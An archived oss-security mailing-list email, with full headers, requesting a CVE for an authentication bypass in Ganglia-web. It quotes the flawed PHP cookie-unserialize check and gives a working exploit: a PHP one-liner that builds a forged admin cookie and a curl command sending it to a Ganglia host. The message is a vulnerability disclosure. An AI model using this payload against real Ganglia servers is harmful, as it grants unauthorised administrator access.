X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["965" "Friday" "4" "September" "2015" "20:34:39" "+0300" "Ivan Novikov" "in@wallarm.com" "<55E9D62F.5030603@wallarm.com>" "26" "[oss-security] CVE request: Ganglia-web auth bypass" nil nil nil "9" "2015090417:34:39" "[oss-security] CVE request: Ganglia-web auth bypass" (number mark "        in@wallarm.c Sep  4   26/965   " thread-indent "\"[oss-security] CVE request: Ganglia-web auth bypass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 14229 invoked by uid 550); 4 Sep 2015 17:40:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 11600 invoked from network); 4 Sep 2015 17:34:51 -0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=wallarm.com; s=default;
	h=Content-Transfer-Encoding:Content-Type:Subject:To:MIME-Version:From:Date:Message-ID; bh=0iCK54vg3S++1EAfTKHepmmzuNzAcFo3OC60Xq4q1xw=;
	b=BmDUHDsWPFhM6VdcTJ47tiNIcg/IO4zIOyv+8ztHaI41pxX3urPv9aL2JY7Ri5+teAWKuoRBo1YSuttpI94ahJkFp+xVQYlUe6bwDJ2kRK4hwpa7LACKXZtmxuMt18xAbqmwYBfkkuulfyZc54UHPzH7KVoXyK43AnxkeedUNNgHyejdvx4IiGabkFmVkG5nhQJofrNLVmvCqb1vIDK5hnYqfA8FN7U4fW7e38OFdr5/6uRdgSultz9i9xIL1NBdd8mqxJTC9H6IxXhjk2mCRNUqNqelmUeO68X9IXShDIDudcbuTqOgrut5mf9spWOA7JUKXrHR2ZfBoBrLrLGw2A==;
Message-ID: <55E9D62F.5030603@wallarm.com>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:31.0) Gecko/20100101 Thunderbird/31.7.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
Date: Fri, 04 Sep 2015 20:34:39 +0300
From: Ivan Novikov <in@wallarm.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE request: Ganglia-web auth bypass
To: oss-security@lists.openwall.com

Reported by GitHub:
https://github.com/ganglia/ganglia-web/issues/267

It's easy to bypass auth by using boolean serialization like this:
$ php -r "echo urlencode(serialize(array('user'=>'admin',
'group'=>'admin', 'token'=>true)));"

Vulnerable code listed below:
https://github.com/ganglia/ganglia-web/blob/4e98ea69e0e18b388cdc73809ce54843a16ff87b/lib/GangliaAuth.php#L34-L46

if(isSet($_COOKIE['ganglia_auth'])) {
  $cookie = $_COOKIE['ganglia_auth'];
  // magic quotes will break unserialization
  if($this->getMagicQuotesGpc()) {
    $cookie = stripslashes($cookie);
  }
  $data = unserialize($cookie);
  if(array_keys($data) != array('user','group','token')) {
    return false;
  }
  if($this->getAuthToken($data['user']) == $data['token']) {

// Found by d90.andrew
// Exploit: curl -H 'Cookie:
a%3A3%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22group%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22token%22%3Bb%3A1%3B%7D'
http://ganglia.local/ganglia/
